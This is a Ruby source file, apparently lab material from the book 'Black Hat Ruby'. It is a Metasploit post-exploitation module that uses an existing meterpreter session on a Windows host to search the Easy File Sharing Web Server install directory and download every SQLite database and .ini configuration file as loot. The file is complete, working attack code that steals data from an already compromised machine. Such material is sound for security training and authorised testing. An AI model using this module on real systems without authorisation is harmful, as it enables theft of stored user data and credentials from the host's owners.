# ========================================================= #
# This file is a part of { Black Hat Ruby } book lab files. #
# ========================================================= #
# 
# Author: 
#   Sabri Hassanyah | @KINGSABRI
# Description: 
#   Metasploit Post Module for 'Easy File Sharing Web Server'
# Requirements: 
#   Metasploit framework 
# 
class MetasploitModule < Msf::Post
  
  include Msf::Post::File

  def initialize(info={})
    super(update_info(info,
        'Name'          => 'Easy File Sharing Web Server dump database',
        'Description'   => %q{
          This module is a Post exploitation module for Easy File Sharing Web Server dump database
          to dump all important files like sqlite(.db) files and configruation files (option.ini).
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Sabri Hassanyah (@KINGSABRI) <King.Sabri[at]gmail.com>' ],
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter' ]
    ))

    register_options(
      [
        OptString.new('FSWS_PATH', [true, "FSWS Installation Path.", 'C:\EFS Software\Easy File Sharing Web Server'])
      ])
  end

  def checks
    case
    when session.platform != "windows"
      print_bad("I Support Windows Only")
      return
    when session.type != "meterpreter"
      print_bad("I Support Meterpreter Sessions Only")
      return
    end
  end

  def run
    checks
    sep = session.fs.file.separator
    path = datastore['FSWS_PATH'].split(/[\/|\\]/).join(sep)
    print_status("Finding all important files in '#{path}'")
    dbs = session.fs.file.search(path, "*.db",  true)
    ini = session.fs.file.search(path, "*.ini", true)
    files = (dbs + ini).collect {|file| [file['path'], file['name']]}

    print_status("Looting #{files.length} files")
    files.each do |file|
      vprint_status("Downloading #{file[1]}")
      loot_path = store_loot(
        "fsws_#{file[1]}",
        "text/plain",
        session.target_host,
        read_file(file.join(sep)),
        file,
        "FSWS #{file[1]} File")
      print_good("Downloaded to: " + loot_path)
    end
  end
end
